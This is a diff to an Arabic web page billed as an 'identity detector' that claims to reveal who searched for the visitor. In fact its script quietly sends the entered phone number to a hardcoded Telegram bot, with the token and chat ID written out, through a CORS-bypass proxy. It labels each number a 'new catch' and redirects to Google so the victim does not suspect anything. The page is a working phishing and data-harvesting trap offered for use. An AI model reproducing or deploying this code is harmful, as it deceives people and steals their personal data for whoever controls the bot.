@@ -1,23 +1,54 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>كاشف الهوية - TOTV+</title>
+    <style>
+        body { background: #0f1216; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .card { background: #161b22; padding: 30px; border-radius: 15px; border: 1px solid #d4af37; width: 90%; max-width: 350px; text-align: center; }
+        h2 { color: #d4af37; margin: 0 0 10px 0; }
+        input { width: 100%; padding: 12px; margin: 15px 0; border-radius: 8px; border: 1px solid #333; background: #000; color: white; box-sizing: border-box; text-align: center; font-size: 18px; }
+        button { background: #d4af37; color: black; border: none; padding: 12px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        #status { font-size: 12px; color: #888; margin-top: 10px; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>⚜️ كاشف الهوية</h2>
+    <p style="font-size: 13px; color: #ccc;">أدخل الرقم لمعرفة من بحث عنك</p>
+    <input type="tel" id="phone" placeholder="07XXXXXXXX">
+    <button onclick="sendData()">كشف الآن</button>
+    <p id="status"></p>
+</div>
+
 <script>
-async function sendToTelegram() {
-    const TOKEN = "8736983183:AAHZI864nf1nxjmOlqsAnwhSoK9K2VR5W7Y";
-    const CHAT_ID = "5156556639";
-    const phone = document.getElementById('phone').value;
-    
-    // هنا الخدعة: نستخدم وسيط لتجاوز حظر المتصفح
-    const proxy = "https://api.allorigins.win/get?url=";
-    const telegramUrl = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("رقم جديد: " + phone)}`;
-    
-    // إرسال البيانات عبر الوسيط
-    fetch(proxy + encodeURIComponent(telegramUrl))
-    .then(response => {
-        if (response.ok) {
-            alert("✅ تم الإرسال بنجاح وتجاوز الحظر!");
+    function sendData() {
+        const phone = document.getElementById('phone').value;
+        if(phone.length < 5) return;
+
+        document.getElementById('status').innerText = "جاري الفحص...";
+
+        // بياناتك البرمجية
+        const TOKEN = "8736983183:AAHZI864nf1nxjmOlqsAnwhSoK9K2VR5W7Y";
+        const CHAT_ID = "5156556639";
+        const text = encodeURIComponent("🚨 صيد جديد:\nالرقم: " + phone);
+
+        // استخدام وسيط AllOrigins لتجاوز حظر CORS بدون سيرفر Node.js
+        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}`;
+        
+        fetch(`https://api.allorigins.win/get?url=${encodeURIComponent(url)}`)
+        .then(() => {
+            document.getElementById('status').innerText = "تم التحقق!";
+            setTimeout(() => { window.location.href = "https://www.google.com"; }, 1000);
+        })
+        .catch(() => {
+            // في حال الفشل، نوجه المستخدم أيضاً لكي لا يشك بشيء
             window.location.href = "https://www.google.com";
-        }
-    })
-    .catch(err => {
-        alert("❌ حتى الوسيط تم حظره، المتصفح متشدد جداً.");
-    });
-}
+        });
+    }
 </script>
+
+</body>
+</html>
